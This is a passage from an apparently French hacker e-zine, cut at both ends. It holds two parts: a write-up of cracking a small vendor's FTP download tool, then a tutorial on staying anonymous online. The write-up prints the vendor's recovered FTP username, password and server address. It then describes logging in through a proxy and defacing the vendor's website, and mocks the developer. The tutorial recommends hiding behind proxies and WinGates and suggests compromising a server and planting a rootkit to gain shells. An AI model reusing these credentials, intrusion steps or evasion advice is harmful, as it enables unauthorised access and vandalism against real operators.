        azertyui000208<br>
        azertyui000208<br>
        azkiriasse0208<br>
        azertyui000208<br>
        azertyui000208 (j'ai pas tous mis car les azertyui000208 yen a des tas).<br>
        Le logiciel fait un tas de truc pour se connecter et le d&eacute;buggage 
        est pas tr&egrave;s passionant. Le prog r&eacute;cup&egrave;re votre nom 
        de machine (huh?), votre marque de modem, vos pr&eacute;f&eacute;rences 
        internet... Il ne s'agit pas d'une fonction du programmeur mais des API 
        VB qui &eacute;tablissent la connexion.<br>
        Au bout d'un loooooong moment, il fait un InternetReadFile.<br>
        Je n'ai pas trouv&eacute; la routine de v&eacute;rification mais quoi 
        qu'il en soit on a un &quot;Le code d'acc&egrave;s que vous avez saisi 
        a &eacute;t&eacute; reconnu.&quot;<br>
        <br>
        Bon qu'est-ce qu'il va faire maintenant que le code est valid&eacute; 
        ? Logiquement il va se connecter au serveur FTP.<br>
        Au bout d'un moment on tombe sur des calculs sur des chaines de caract&egrave;res. 
        Voici les chaines qui nous int&eacute;ressent (l&agrave; encore j'ai du 
        pas mal fouiller) :<br>
        220<br>
        USER jmariotte<br>
        331<br>
        PASS xahopowy<br>
        230<br>
        TYPE I<br>
        200<br>
        PORT<br>
        RETR /web/zip/kiriasse.hlp<br>
        <br>
        Ca m'a tout l'air d'une communication FTP (voir RFC 959). Mais on n'a 
        pas vu quelle &eacute;tait l'adresse du serveur :(<br>
        En fait apr&egrave;s avoir cherch&eacute; sans succ&egrave;s au dessus 
        je l'ai trouv&eacute; en dessous. Le prog ne faisait que mettre les strings 
        en m&eacute;moire.<br>
        And now Ladies &amp; Gentlemen the FTP Server is ... ftp.kiriasse.fr<br>
        <br>
        A partir de l&agrave; j'ai laiss&eacute; tomber le d&eacute;bugage et 
        je me suis connect&eacute; au serveur (n'oubliez pas d'utilisez un serveur 
        SOCKS pour &ecirc;tre anonyme). En explorant j'ai fait une grande d&eacute;couverte. 
        Mais j'aurais pu le deviner avant.<br>
        <br>
        Vous vous souvenez l'adresse du fichier F : www.kiriasse.fr/zip/kiriasse.kir 
        ? Ya donc un rep &quot;zip&quot; dans la racine web !<br>
        Vous vous souvenez de la commande pour obtenir le fichier kiriasse.hlp 
        ? RETR /web/zip/kiriasse.hlp<br>
        C'est marrant dans les deux cas ya un r&eacute;pertoire &quot;zip&quot; 
        dis donc !!<br>
        On sait quoi ? On sait que zip est dans la racine web et on sait que au 
        dessus de zip ya le rep &quot;web&quot; accessible par FTP !!! LoL !!!<br>
        Ben oui le site web est enti&egrave;rement accessible par le ftp. Ca permet 
        &agrave; l'admin d'uploader ses pages. Perso je consid&egrave;re cela 
        comme une faille de s&eacute;curit&eacute; mais si t'es h&eacute;berg&eacute; 
        par un truc du style Amen.fr (ce qui est le cas) tu peux pas faire autrement.<br>
        <br>
        Quoi qu'il en soit on a le login, le pass, l'adrese du ftp et l'emplacement 
        de la racine web. Comme dirait Bigard ca c'est le meilleur moment. Quand 
        tu l'as devant toi et que t'es pr&egrave;s &agrave; tirer, parce qu'apr&egrave;s 
        tout les grands d&eacute;faceurs te le diront, c'est juste de l'informatique 
        g&eacute;n&eacute;rale.<br>
        <br>
        Donc je me suis d&eacute;connect&eacute; histoire de pr&eacute;parer mon 
        d&eacute;facage. J'ai cr&eacute;&eacute; une page web avec une image. 
        Puis j'ai upload&eacute; l'image, la page web et le tutorial sur FTP Rapide 
        sur le serveur FTP dans la racine web. Au final : une belle page web avec 
        un lien vers le tut de FTP Rapide &amp; son keygen se trouvant sur le 
        serveur m&ecirc;me de kiriasse (un sacr&eacute; pied de nez). Et l'image 
        que voici :<br>
        <center>
          <img src="fichiers/CAT.GIF" width="318" height="444"> 
        </center>
        <br>
        Ben ouais le chat d'alice comme d'habitude ;-)<br>
        Voici les erreurs commises par le programmeur : coder en VB (c'est clair 
        net et pr&eacute;cis), faire un logiciel tel que Mini FTP, et l&agrave; 
        c'est sans doute le plus gros probl&egrave;me. Car en effet il aura beau 
        crypter la communication etc... On trouvera toujours le moyen d'acceder 
        au serveur FTP. La racine web sur le serveur FTP c'est une erreur aussi.<br>
        Franchement si j'avais su, j'aurais utilis&eacute; un sniffer je serais 
        all&eacute; 100 fois plus vite (au moins &ccedil;a).<br>
        Quels conseils on peut donner au d&eacute;vellopeur ? Ben arr&ecirc;ter 
        de coder en VB donc. Ensuite avoir son propre serveur ftp et donner aucun 
        droit en &eacute;criture &agrave; ceux qui se connectent avec le compte 
        jmariotte est la solution la plus efficace. Kiriasse peut alors garder 
        un compte perso qui lui donne tous les droits avec un autre login. Il 
        peut aussi coder son propre serveur FTP qui ne respecterait pas le protocole 
        (en modifiant les commandes par exemple) ainsi il interdit l'acc&egrave;s 
        &agrave; travers un client FTP standart. Et ya sans doute un tas d'autres 
        solution.<br>
        <br>
        Et si on relisait les infos qu'il donnait pour rire ?<br>
        <u>Version de d&eacute;monstration :</u> cette version de Mini FTP est 
        gratuite et compl&egrave;te <span class="menu">(pour &ecirc;tre compl&egrave;te 
        elle l'est)</span>. Elle permet &agrave; titre d'exemple de t&eacute;l&eacute;charger 
        <span class="menu">(et d'uploader)</span>, apr&egrave;s saisie d'un mot 
        de passe <span class="menu">(tu parle du mot de passe FTP je pense LoL)</span>, 
        les programmes d'installation de tous les logiciels pr&eacute;sent&eacute;s 
        sur le site Kiriasse Logiciels.<br>
        <br>
        <u>Version personnalis&eacute;e :</u> sur ce mod&egrave;le, je vous propose 
        de d&eacute;velopper pour vous un ou plusieurs MiniFTP personnalis&eacute;s 
        (adapt&eacute;s &agrave; votre cas personnel) qui permettront &agrave; 
        toute personne &agrave; qui vous aurez communiqu&eacute; un mot de passe 
        <span class="menu">(tu parles de ceux dans le fichier kiriasse.kir ? Ils 
        peuvent aller les chercher tout seuls !!)</span> de t&eacute;l&eacute;charger 
        des fichiers de votre choix, plac&eacute;s par vos soins sur un serveur 
        FTP, &agrave; une adresse connue de vous seul <span class="menu">(et de 
        sirius_black et ses lecteurs)</span>. <br>
        <br>
        La version de d&eacute;monstration permet, &agrave; titre d'exemple, de 
        t&eacute;l&eacute;charger les fichiers zip contenant les programmes d'installation 
        de mes logiciels et le mot de passe &agrave; saisir (qui est incorpor&eacute; 
        dans un certain fichier F plac&eacute; sur Internet) est &quot;kiriasse&quot; 
        : pour cette version de d&eacute;monstration, l'emplacement de ces fichiers 
        sur Internet (et le mot de passe) ne sont donc &eacute;videmment un secret 
        pour personne <span class="menu">(mais rien n'est secret coco)</span>. 
        <br>
        Pour imaginer ce que peut &ecirc;tre une version personnalis&eacute;e 
        <span class="menu">(la mienne me suffit et c'est la d&eacute;mo)</span>, 
        il faut donc (en pens&eacute;e) &laquo; faire comme si &raquo; l'on ignorait 
        l'emplacement des fichiers &agrave; t&eacute;l&eacute;charger <span class="menu">(&ccedil;a 
        va &ecirc;tre difficile de s'en convaincre)</span>. La question &agrave; 
        se poser est alors : &laquo; Peut-on, sans conna&icirc;tre aucun mot de 
        passe, acc&eacute;der au t&eacute;l&eacute;chargement des fichiers ? &raquo;<span class="menu"> 
        Moi !! Monsieur Msieur !! J'connais la r&eacute;ponse Msieur !! C'est 
        Oui !!</span>. Je pr&eacute;tends que la r&eacute;ponse est NON, pour 
        99% des personnes qui utilisent un ordinateur <span class="menu">(putain 
        c'est un coup &agrave; se prendre pour un l33t)</span>. Mais je ne suis 
        pas na&iuml;f et je n'ignore pas que mon logiciel (qui ne co&ucirc;te 
        que 15,24 &euro;) n'assure pas une s&eacute;curit&eacute; absolue <span class="menu">(...)</span>: 
        si vous &ecirc;tes l'un des responsables des Renseignements G&eacute;n&eacute;raux 
        ou haut fonctionnaire au minist&egrave;re de la D&eacute;fense, je ne 
        vous conseille donc pas, dans l'exercice de vos fonctions, d'utiliser 
        MiniFTP ! <span class="menu">(moi si je vous le conseille vivement !!!)</span><br>
        A noter aussi que je place, dans les r&eacute;pertoires concern&eacute;s 
        du serveur FTP, un fichier index.html, ce qui a pour effet d'interdire 
        l'affichage, par un navigateur WEB, de la liste des fichiers contenus 
        dans ces r&eacute;pertoires <span class="menu">(...) : parfois un silence 
        est plus fort que tout</span>. </p>
    </td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="anonymat"></a>Tutoriel 
      sur l'anonymat</td>
  </tr>
  <tr> 
    <td height="66" valign="top" class="textpetit"> 
      <p>Voici un tut sur l'anonymat. J'ai essay&eacute; de rassembl&eacute; le 
        plus d'informations possibles. Anonymat sur le web mais aussi sur IRC, 
        FTP... Enjoy :)</p>
      <p>L'anonymat est plus qu'important sur l'internet mais aussi dans la vie 
        de tous les jours. Quand vous allez acheter une baguette de pain vous 
        ne souhaitez pas que le boulanger vous demande votre nom, votre m&eacute;tier, 
        votre adresse, num&eacute;ro de t&eacute;l&eacute;phone... Et le boulanger 
        ne vous les demande pas car il respecte votre vie priv&eacute;e.<br>
        Sur Internet c'est moins &eacute;vident. Tout d'abord parce que l'Internet 
        est tr&egrave;s commercial et il n'h&eacute;site pas &agrave; r&eacute;aliser 
        toutes sortes de statistiques dans ce but. Et puis aussi par mesure de 
        s&eacute;curit&eacute; : les serveurs gardent des traces de votre passage.</p>
      <p class="texttitre">Le web</p>
      <p>Alors comment faire pour pr&eacute;server sa vie priv&eacute;e sur le 
        web ? Regardons d'abord ce qu'un serveur web peut r&eacute;cup&eacute;rer 
        comme donn&eacute;e vous concernant :</p>
      <ul>
        <li>votre adresse IP</li>
        <li>Votre nom d'ordinateur</li>
        <li>Votre pays</li>
        <li>Votre ville</li>
        <li>Le nom de votre navigateur</li>
        <li>Le nom de votre syst&egrave;me d'exploitation</li>
        <li>Votre r&eacute;solution d'&eacute;cran</li>
        <li>L'adresse web que vous avez visit&eacute; auparavant</li>
        <li>Votre FAI (Fournisseur Acc&egrave;s Internet)</li>
        <li>Votre adresse email</li>
        <li>Votre adresse physique</li>
        <li>La configuration de votre navigateur</li>
        <li>Les plug-in install&eacute; (java, activeX...)</li>
        <li>Les informations enregistr&eacute;es dans les cookies</li>
        <li>et bien plus selon votre configuration personnelle et les vuln&eacute;rabilit&eacute;s 
          de votre navigateur :)</li>
      </ul>
      <p>Ceci est du en grande partie au donn&eacute;es envoy&eacute;es par votre 
        navigateur. Pour vous en convaincre, lancer netcat avec &quot;nc -l -p 
        8080&quot; et configurer votre navigateur avec le proxy HTTP &quot;127.0.0.1:8080&quot;. 
        Personnelement j'obtient :</p>
      <p>GET http://127.0.0.1/ HTTP/1.1<br>
        Host:127.0.0.1<br>
        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:0.9.4) 
        Gecko/20011019 Netscape6<br>
        Accept: text/xml, application/xml, application xhtml+xml, text/html;q=0.9, 
        image/png, image/jpg, image/gif;q=0.2, text/plain;q=0.8, text/css, */*;q=0.1<br>
        Accept-Langage: fr-fr<br>
        Accept-Encoding:gzip, deflate, compress;q=0.9<br>
        Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66<br>
        Keep-Alive: 300<br>
        Proxy-Connection: keep-alive<br>
        <br>
        On peut voir ici que j'utilise Netscape 6.0 (Gecko) sous Windows XP version 
        professionnelle (NT 5.1) . Et que je suis francophone de France. Le serveur 
        connait bien &eacute;videmment l'adresse IP car votre requ&ecirc;te HTTP 
        est encapsul&eacute; dans un paquet TCP puis IP.<br>
        Dans cet exemple je n'&eacute;tais pas connect&eacute; au web et j'ai 
        demand&eacute; une page &agrave; mon propre serveur. Mais quand vous &ecirc;tes 
        sur Internet, l'adresse IP permet de conna&icirc;tre par le biais de DNS 
        votre nom de machine.<br>
        Votre ISP vous donne un nom de machine reconnaissable du type 652.154-cable-wanadoo-marseille.fr. 
        Il n'est pas compliqu&eacute; pour le serveur de voir d'o&ugrave; vous 
        vous connectez :(.<br>
        Quand vous &ecirc;tes sur un r&eacute;seau scolaire ou d'entreprise et 
        que vous disposez de boites &eacute;lectroniques accessibles par votre 
        navigateur il se peut que ce dernier renvoie aussi votre adresse email. 
        Pour peut que celle ci soit du type votre_nom.votre_prenom@votre_reseau.com, 
        vous perdez toute confidentialit&eacute; sur Internet.<br>
        Mais je vous rassure les machines des r&eacute;seaux dont je viens de 
        parler sont en g&eacute;n&eacute;ral configur&eacute;s pour passer sur 
        un proxy de ce r&eacute;seau et celui-ci enl&egrave;ve les donn&eacute;es 
        sans valeur pour les requ&ecirc;tes (il n'y a pas besoin de l'adresse 
        mail pour optimiser l'affichage d'une page web).<br>
        Quand vous cliquez sur un lien dans une page P, celle ci est enregistr&eacute; 
        dans le Referer et envoy&eacute; lors de la req&ecirc;te (voir LOTFREE#03).</p>
      Pour cacher ces donn&eacute;es ya pas 36 solutions : il faut se faire passer 
      pour quelqu'un d'autre. C'est pour cela que l'on utilise des serveurs proxys. 
      Attention tous ne vous cachent pas. Certains s'arragent en effet pour faire 
      savoir que c'est vous qui demandez la page. Pour tester votre proxy je vous 
      conseille la page <a href="http://www.anonymat.org/vostraces"><span class="menu2">www.anonymat.org/vostraces</span></a>. 
      C'est l&agrave; que je vais &agrave; chaque changement de proxy. Il y a 
      des pages plus d&eacute;taill&eacute;es avec toutes les donn&eacute;es mais 
      celle-ci est rapide et simple &agrave; comprendre : il suffit de regarder 
      le nom de machine, si il contient le nom de votre FAI c'est que c'est pas 
      bon. Tous les proxys ne se valent pas. D&eacute;j&agrave; certains sont 
      payant et il faut un login/password pour se connecter. D'autres n'acceptent 
      que certaines adresses IP. Certains n'ont pas de nom de machines (pas de 
      nom de domaine), certains ne transmettent pas le type de navigateur. Il 
      y a ceux qui ont des noms marrant comme ph34r.my.stealthedip.com ou elite.ownsalldomains.org 
      (en g&eacute;n&eacute;ral il filtrent les ips).<br>
      Perso mon truc c'est de faire croire que j'utilise un autre FAI que le mien 
      dans un autre pays que le mien. Et bien &eacute;videmment il faut qu'il 
      soit rapide. Mon autre truc c'est donc de prendre c'est qui ont soit cable 
      soit adsl dans leur noms. Ca booste consid&eacute;rablement votre connexion 
      surtout pour les sites vraiment distants (sites russes par exemple). En 
      ce moment j'utilise en majorit&eacute; le proxy adsl de wanadoo belgique. 
      Vous trouverez de tels adresses &agrave; <a href="http://theproxyconnection.com"><span class="menu2">theproxyconnection.com</span></a>.<br>
      Au cas o&ugrave; ceux de proxyconnection ne marche pas allez sur <a href="http://www.multiproxy.org"><span class="menu2">www.multiproxy.org</span></a>. 
      Il donnent une liste qui se raffraichie r&eacute;guli&egrave;rement.<br>
      <br>
      Multiproxy est surtout le cr&eacute;ateur d'un logiciel du m&ecirc;me nom. 
      Ce dernier permet de changer de proxy &agrave; des intervalles r&eacute;guliers 
      (du style toutes les 30 secondes). C'est lui m&ecirc;me un petit proxy (qui 
      tourne sur votre machine) qui fait le relai vers d'autres proxies. Il suffit 
      pour l'utiliser de vous connecter sur votre proxy local et il se charge 
      du reste :)<br>
      <br>
      Notez qu'il est possible de &quot;chainer&quot; les proxys en configurant 
      votre navigateur avec l'adresse de proxy &quot;http://proxy1:port1/http://proxy2:port2&quot; 
      mais ceci ralentit consid&eacute;rablement votre connexion.<br>
      <br>
      Un autre outil configurable en profondeur est le Proximitron. Il marche 
      de la m&ecirc;me fa&ccedil;on que multiproxy. Vous pouvez cacher certaines 
      variables d'environnement, les modifer et m&ecirc;me plus ou moins modifier 
      votre adresse IP. En fait en modifiant les champs d'une requ&ecirc;te HTTP 
      tel que HTTP_VIA, HTTP_FORWARDED le proximitron fera croire que lui m&ecirc;me 
      se sert d'un proxy. 
      <p>Il y a aussi les cookies qui sont stock&eacute;s sur votre PC et permettent 
        &agrave; un site de savoir si vous &ecirc;tes d&eacute;j&agrave; pass&eacute; 
        avant et quand. Le probl&egrave;me c'est que n'importe quel site peut 
        lire ces cookies c'est pour cela qu'il est important que chaque site crypte 
        ses propres cookies. Effacez les &agrave; chaque fois que vous vous d&eacute;connectez 
        car certains gardent en m&eacute;moire vos mot de passe.<br>
        <br>
        Les proxys vous cachent des sites web que vous visitez mais pas de votre 
        FAI. Vous pouvez leur cacher vos donn&eacute;es par le biais d'un tunnel. 
        Un tunnel c'est une liaison crypt&eacute;e entre vous et votre proxy. 
        L'avantage c'est que &ccedil;a peut marcher avec d'autres protocoles tels 
        que FTP, Telnet...<br>
        <br>
        <span class="texttitre">IRC</span></p>
      <p>Je ne connait pas grand chose niveau IRC mais je vais faire de mon mieux.</p>
      <p>Sur IRC, une personne peut surtout obtenir votre IP mais aussi votre 
        nom, votre pr&eacute;nom... Mais il faut &eacute;videmment NE JAMAIS DONNER 
        SA VERITABLE IDENTITE A TOUT SUPPORT INFORMATIQUE. M&ecirc;me si votre 
        PC n'est pas reli&eacute; &agrave; Internet il faut &eacute;viter. Une 
        personne peut obtenir des infos sur vous par IRC tout simplement avec 
        les commandes /whois et /dns.</p>
      <p>Quand on parle de l'anonymat sur IRC, la premi&egrave;re chose qui vient 
        &agrave; l'esprit c'est les WinGates. WinGate vient de la compression 
        du mot Windows et de Gate qui signifie Entr&eacute;e ou Portail.</p>
      <p>D&egrave;s fois on tombe sur des articles ou les WinGates sont pr&eacute;sent&eacute;es 
        comme des failles Windows, ce qui n'est pas le cas.<br>
        Une Wingate c'est un produit tr&egrave;s populaire sur Internet qui a 
        &eacute;t&eacute; cr&eacute;e par une soci&eacute;t&eacute; informatique 
        bas&eacute;e en Nouvelle Z&eacute;lande appell&eacute;e Firefly, Ltd. 
        En fait on peut consid&eacute;rer une WinGate comme un serveur Proxy/Firewall 
        &agrave; faible co&ucirc;t, c'est d'ailleurs ce qui a fait sa popularit&eacute;. 
        Comme on peut s'en douter WinGate marche sur les machines Windows (95/98/NT 
        et XP ?). A noter qu'un programme similaire existe pour MAC baptis&eacute; 
        Vicom Internet Gateway.</p>
      <p>WinGate, comme tout serveur Firewall, est connect&eacute;e sur Internet 
        et permet &agrave; son r&eacute;seau local d'en faire autant. WinGate 
        est tr&egrave;s utilis&eacute; par les PME (Petites &amp; Moyennes Entreprises) 
        car en installer une ne coutera au minimum qu'un pauvre ptit pentium, 
        un modem 56k, une carte 100/baseT, une connexion Internet et &eacute;videmment 
        le prix de la WinGate.</p>
      <p>Une WinGate poss&egrave;de beaucoup de fonctionnalit&eacute;es telle 
        que serveur SOCKS 5 (on verra ca plus tard), proxy Web/Cache, enregistrement 
        des logs (&ccedil;a ca nous arrange pas), comptes, syst&egrave;mes de 
        droits, passerelle FTP (hun hun), Telnet (huhu), proxy Real Audio, POP3 
        et bien d'autres :)</p>
      <p>Vous avez sans doute remarqu&eacute; la fonction de passerelle Telnet. 
        Celle ci vous permettra de vous connecter via Telnet &agrave; un serveur 
        IRC. Pour cela c'est tr&egrave;s simple vous vous connectez avec Telnet 
        sur la WinGate et ce sur le port 23 (telnet). Vous obtenez en g&eacute;n&eacute;ral 
        un prompt du style 'WinGate&gt;'. Vous n'avez alors qu'&agrave; entrer 
        l'IP de votre serveur IRC suivi de son port, le tout s&eacute;par&eacute; 
        par des espaces. La plupart des clients IRC ont une option qui permet 
        de passer &agrave; travers un Firewall. Il suffit donc pour &ecirc;tre 
        anonyme sur IRC de configurer votre client avec comme Firewall la Wingate 
        et &ccedil;a devrait marcher ;).</p>
      <p>Alors qu'elle est la diff&eacute;rence entre un shell distant (on verra 
        &ccedil;a plus tard) et une WinGate ? Et bien tout simplement la WinGate 
        ne requiert pas forc&eacute;ment de passwords pour s'y connecter. En fouillant 
        vous pourrez trouver plusieurs WinGate et ainsi les chainer, vous augmentez 
        ainsi votre anonymat.</p>
      <p>Alors les WinGate &ccedil;a rend vraiment anonyme ? Tout d'abord on est 
        jamais (ou presque) &agrave; cent pour cent anonyme. Ensuite on a vu que 
        les WinGate poss&egrave;dent des fonctions qui permettent de garder des 
        traces de qui se connecte et o&ugrave;. Sachez quand m&ecirc;me que cette 
        option n'est pas activ&eacute;e par d&eacute;faut et que certaines versions 
        du logiciel ne la poss&egrave;dent m&ecirc;me pas.</p>
      <p>Oui mais est-ce qu'un mec sur IRC peut quand m&ecirc;me conna&icirc;tre 
        mon adresse IP ? Hehe !! Vous &ecirc;tes anonymes car vous utilisez une 
        passerelle. Si le mec arrive &agrave; avoir une connexion directe avec 
        vous il peut par la commande netstat (sous dos) avoir votre vrai IP. Comment 
        il fait ? Simple il va essayez d'avoir une connexion directe par le biais 
        d'une session de Chat ou d'un simple transfet de fichier :). Donc meffiez 
        vous de ce qu'on vous propose m&ecirc;me si &ccedil;a vous parrait anodin.</p>
      <p class="texttitre">ICQ - La pire des choses qui soit arriv&eacute; &agrave; 
        votre vie priv&eacute;e</p>
      <p>Le titre de ce chapitre est pris, comme cette partie, du tutorial sur 
        l'anonymat de astalavista.box.sk.<br>
        ICQ est consid&eacute;r&eacute; pour beaucoup comme &eacute;tant une menace 
        &agrave; votre vie priv&eacute;e. Durant son &eacute;volution, il a &eacute;t&eacute; 
        victime de nombreux bugs et autres vuln&eacute;rabilit&eacute;s qui ont 
        permis &agrave; des persones malicieuses de r&eacute;colter des informations 
        sur d'autres persones, de flooder un utilisateur de messages et ainsi 
        planter sa machine, voler ses passwords et m&ecirc;me s'introduire sur 
        sa machine.</p>
      <p>Les vuln&eacute;rabilit&eacute;s se sont enchain&eacute;es et une quantit&eacute; 
        trop importante existe toujours. Mais celle qui nous concerne viens du 
        concept m&ecirc;me de ICQ. En effet ICQ est un client &agrave; connexion 
        directe. Si vous avez lu le chapitre sur IRC vous avez d&eacute;j&agrave; 
        compris : n'importe qui peut r&eacute;cup&eacute;rer votre adresse IP, 
        il lui suffit de dialoguer avec vous ou de vous envoyer un fichier... 
        tout en tapant le fameux netstat.</p>
      <p>Mais et l'option &quot;ne pas r&eacute;v&eacute;ler mon adresse&quot; 
        ? Foutaises !! Votre client ne va effectivement pas r&eacute;v&eacute;ler 
        votre adresse si il re&ccedil;oit une commande ICQ le lui demandant. Mais 
        pour ce qui est des commandes msdos c'est autre chose :).</p>
      <p>La solution serait &eacute;videmment de cr&eacute;er des serveurs proxy 
        ICQ. Mais quel serveur voudrait autant de zozos sur sa bande passante 
        ? Il faudrait que le responsable de cette merde (Mirabilis) mette en place 
        un tel serveur. La v&eacute;rit&eacute; c'est qu'ils s'en battent les 
        couilles de votre vie priv&eacute;. D'ailleurs qui vous dit que ICQ n'e 
        poss&egrave;de pas une fonctionnalit&eacute;e d'espionnage ? Une seule 
        solution donc : laisser tomber ICQ. Cela dit j'ai lut quelques part que 
        SOCKS reconnait ICQ mais je n'ai pas v&eacute;rifi&eacute; cette info. 
        Lisez le chapitre sur FTP pour plus de d&eacute;tails sur SOCKS.</p>
      <p class="texttitre">Les mails</p>
      <p>Les mails c'est un des domaines o&ugrave; il est le plus facile de cacher 
        son identit&eacute; (IP et adresse mail). En effet il existe des tas de 
        services qui permettent l'envoi de mail anonymes (rechercher anonymail). 
        Vous pouvez aussi utilisez un serveur SMTP et modifier votre adresse mail 
        (voir LOTFREE#01) mais attention certains relient votre adresse IP. Cette 
        m&eacute;thode est &agrave; &eacute;viter si vous poss&eacute;der une 
        IP fixe.</p>
      <p>Je ne m'&eacute;tend pas sur le probl&egrave;me l'anonymat par email 
        mais si &ccedil;a vous int&eacute;resse je vous conseille fortement de 
        lire de la documentation sur les Remailers (sorte de proxy pour mails) 
        et les serveurs de pseudonymes qui vous donnent en quelque sorte une adresse 
        virtuelle qui fait le relais avec votre v&eacute;ritable bo&icirc;te mail 
        (la transaction est en plus crypt&eacute;e :)</p>
      <p class="texttitre">FTP</p>
      <p>Voil&agrave; un chapitre qui devrait vous int&eacute;resser puisqu'il 
        est &eacute;troitement li&eacute; &agrave; mon article sur le hack de 
        kiriasse.<br>
        En effet selon la vuln&eacute;rabilit&eacute; que vous exploitez sur un 
        serveur, vous n'allez pas utilisez le m&ecirc;me type d'anonymat. Sur 
        un serveut IIS victime de la faille unicode, un simple serveur proxy web 
        suffit :p. Si vous brutteforcez un pass POP3 mieux vaut utiliser une WinGate...<br>
        Pour le FTP vous pouvez aussi utiliser une WinGate mais ici on va voir 
        un autre type de proxy : les proxy SOCKS.</p>
      <p>La technologie SOCKS est tr&egrave;s tr&egrave;s puissante et reconnait 
        beaucoup de protocoles. Vous pouvez l'utiliser pour les NewsGroup, Telnet, 
        les Chats, IRC... On peut consid&eacute;rer un proxy SOCKS comme &eacute;tant 
        un serveur proxy. Le d&eacute;saventage par rapport &agrave; une WinGate 
        est le besoin de s'identifier avec un login/password : il est tr&egrave;s 
        difficle de trouver un proxy SOCKS en libre acc&egrave;s (il est d'ailleurs 
        tr&egrave;s difficile de trouver un serveur SOCKS qui marche :( sigh !!).</p>
      <p>A ma connaissance il n'y a que deux versions du protocole SOCKS : 4 &amp; 
        5. Un proxy SOCKS 4 ne reconnait pas l'authentification (cool) mais ne 
        reconnait pas non plus le protocole UDP (pas cool). Le SOCKS 5 a r&eacute;gl&eacute; 
        ces probl&egrave;mes.</p>
      <p>Tous les logiciels de communication r&eacute;cents autorisent l'utilisation 
        d'un tel proxy : Netscape, Internet Explorer, Cute FTP, FlashFXP...</p>
      <p>En g&eacute;n&eacute;ral un proxy SOCKS tourne sur le port 1080 mais 
        il peut &ecirc;tre configur&eacute; autrement. Comme je l'ai dit plus 
        haut il est vraiment tr&egrave;s d&ucirc;r de trouver un proxy SOCKS. 
        Personellement j'ai mis une semaine avant de trouver un serveur SOCKS 
        valide. Car il existe effectivement des listes de serveur SOCKS sur Internet, 
        mais une fois retir&eacute; ceux qui ne marchent pas, ceux qui demandent 
        un mot de passe et ceux qui firltrent l'IP, il reste... rien.</p>
      <p>Alors comment en trouver ? Et bien la solution est d'aller sur les sites 
        de ceux qui en utilisent tout le temps : les boards Warez !! (voir Zataz 
        mag N&deg;6).</p>
      <p>A noter qu'il est possible de se servir d'un proxy SOCKS et ce m&ecirc;me 
        si votre logiciel est vieux. Cet exploit est r&eacute;alisable gr&acirc;ce 
        au logiciel SocksCap. Le probl&egrave;me est qu'il ne marche qu'avec les 
        SOCKS 5 (&ccedil;a restreint les chances d'utilisation). SocksCap permet 
        en effet d'encapsuler la communication du client dans une communication 
        SOCKS. Il suffit pour cela de configurer le logiciel que vous d&eacute;sirez 
        utiliser dans SocksCap. L'ic&ocirc;ne de ce soft apparait alors dans la 
        fen&ecirc;tre de SocksCap, il ne vous reste qu'&agrave; double cliquer 
        dessus. Le d&eacute;savantage est la n&eacute;cessit&eacute; de passer 
        par SocksCap &agrave; chaque lancement de votre client.</p>
      <p>Le probl&egrave;me majeur de SOCKS est de ne pas reconna&icirc;tre les 
        requ&ecirc;tes DNS, ceci nous oblige donc &agrave; utiliser les adresses 
        IP des serveurs et non leurs noms.</p>
      <p>Vous trouverez dans le dossier &quot;fichiers&quot; inclus dans le mag 
        un document pdf r&eacute;alis&eacute; par le site anonymat.org et qui 
        explique bien mieux que moi comment utiliser SocksCap.</p>
      <p class="texttitre">Telnet</p>
      <p>Telnet !!! Alala !! Ca c'est du protoc&ocirc;le !!! Il permet de grande 
        choses et il est donc n&eacute;cessaire pour un hacker de savoir l'utiliser 
        et ce anonymement. On a vu qu'il existait certaines solutions telles que 
        les WinGate, les proxy Socks et m&ecirc;me le tunneling (voire plus bas). 
        Mais une solution &agrave; laquelle on pense quand on parle de Telnet 
        c'est les shells !!! Un shell si vous savez pas ce que c'est, c'est en 
        gros une ligne de commande &agrave; partir de laquelle vous pouvez faire 
        tout ce que vous voulez. Int&eacute;ressant non ?<br>
        Bref c'est un account sur une machine distante &agrave; laquelle vous 
        vous connectez par mot de passe. Et l&agrave; d&eacute;sol&eacute; mais 
        vous trouverez pas de shells libres, o&ugrave; alors celui d'un cr&eacute;tin 
        sous linux qui a un compte root sans password... hum !!<br>
        Plus s&eacute;rieusement la plupart des comptes shells que l'on peut trouver 
        sur Internet sont payants et apparemment, &ccedil;a se vend bien. Autre 
        solution : pirater un serveur, laisser un rootkit (c'est une backdoor 
        &eacute;volu&eacute; avec souvent sniffing et autre type d'espionnage 
        du r&eacute;seau int&eacute;gr&eacute;) et revenir &agrave; chaque fois 
        que l'on a besoin d'un shell.</p>
      <p class="texttitre">Le Tunneling</p>
      <p>Vous avez peut &ecirc;tre entendu parler de logiciels qui permettent 
        de faire de l'IRC &agrave; travers une communication HTTP (pages web). 
        Et bien cette m&eacute;thode s'appelle le tunneling. Comme son nom l'indique 
        on cr&eacute;e un tunnel dans un protoc&ocirc;le (souvent le HTTP car 
        le plus utilis&eacute;) puis on y fait passer presque tout ce qu'on veut.</p>
      <p>Cette technique est tr&egrave;s utilis&eacute;e dans les pays o&ugrave; 
        la libert&eacute; d'expression, de pens&eacute;e, etc. est baffou&eacute;e 
        (je pense &agrave; la Chine). Heureusement certains groupes comme Hacktivismo, 
        cr&eacute;&eacute; par Count Zero de The Cult of The Dead Cow sont l&agrave; 
        pour cr&eacute;er des logiciels pour leurs venir en aide. Pour info la 
        peine encourue par les pirates en Chine peut monter &agrave; la peine 
        de mort. Deux pirates chinois se sont d'ailleurs fait fusiller pour avoir 
        dit ce qu'ils pensaient de leurs dirigeants sur un serveur gouvernemental.</p>
      Je tenais &agrave; vous parler du logiciel HTTPort que vous trouverez sur 
      <a href="http://www.htthost.com"><span class="menu2">www.htthost.com</span></a>, 
      ce dernier permet d'utiliser le tunneling pour un tas de logiciels r&eacute;cents 
      et moins r&eacute;cents : les logiciels de P2P, ICQ, les messageries, FTP, 
      IRC, AIM... et il est m&ecirc;me pr&eacute;vu de faire tourner Quake &amp; 
      Co dans les prochaines versions. 
      <p class="texttitre">Alors l'anonymat &ccedil;a existe vraiment ?</p>
      <p>Oui il y a quelques fa&ccedil;ons d'&ecirc;tre r&eacute;ellement intracable. 
        On a vu que &agrave; chaque fois, si on pouvait tromper notre victime, 
        il &eacute;tait difficile de tromper le provider. Une des solutions que 
